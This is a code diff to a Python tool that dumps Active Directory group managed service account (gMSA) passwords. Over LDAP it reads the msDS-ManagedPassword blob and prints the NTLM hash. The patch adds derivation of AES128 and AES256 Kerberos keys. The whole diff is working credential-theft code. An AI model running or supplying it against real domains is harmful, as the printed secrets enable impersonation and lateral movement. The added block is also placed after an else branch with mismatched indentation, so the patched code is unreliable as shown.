@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
 import argparse
-import binascii
+from binascii import hexlify
 from Cryptodome.Hash import MD4
 from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
 from impacket.structure import Structure
+from impacket.krb5 import constants
+from impacket.krb5.crypto import string_to_key
 import sys
 
 parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
@@ -103,14 +105,25 @@ def main():
                     data = entry['msDS-ManagedPassword'].raw_values[0]
                     blob = MSDS_MANAGEDPASSWORD_BLOB()
                     blob.fromString(data)
-                    hash = MD4.new ()
-                    hash.update (blob['CurrentPassword'][:-2])
-                    passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                    currentPassword = blob['CurrentPassword'][:-2]
+
+                    # Compute ntlm key
+                    ntlm_hash = MD4.new ()
+                    ntlm_hash.update (currentPassword)
+                    passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                     userpass = sam + ':::' + passwd
                     print(userpass)
     else:
         print('LDAP query failed.')
         print(success)
+
+                    # Compute aes keys
+                    password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
+                    salt = '%shost%s.%s' % (args.domain.upper(), sam[:-1], args.domain.lower())
+                    aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
+                    aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
+                    print('%s:aes256-cts-hmac-sha1-96:%s' % (sam, aes_256_hash.decode('utf-8')))
+                    print('%s:aes128-cts-hmac-sha1-96:%s' % (sam, aes_128_hash.decode('utf-8')))
 
 if __name__ == "__main__":
     main()
